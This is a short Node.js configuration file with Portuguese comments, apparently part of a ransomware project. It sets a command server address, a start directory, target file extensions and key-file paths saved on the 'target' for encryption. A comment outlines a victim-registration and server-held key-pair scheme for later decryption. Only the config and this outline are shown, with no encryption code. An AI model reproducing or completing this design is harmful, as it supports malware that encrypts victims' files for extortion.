const path  = require("path");
const extensions = require("./extensions");

const devConfig = {
    remoteServer:"http://localhost:3333",
    startDirectory: "./files",
    sysInfoPath: path.join(__dirname, "..", "info.dat"), 
    extensions,
    symetricKeyPath: path.join(__dirname, "..", "secret.key"),    // salva localmnt no alvo p/ encrypt
    privateKeyPath: path.join(__dirname, "..", "private.key"),    // salva localmnt no alvo ... 
    passphrasePath: path.join(__dirname, "..", "passphrase.key")  // quando for decrypt

};

module.exports = devConfig;

/*
1 - registra maq no server
2 - server gerar o par de chaves
3 - server armazena a priv-key + passphrase
4 - server manda pub-key p/ o alvo
5 -     
*/

//-2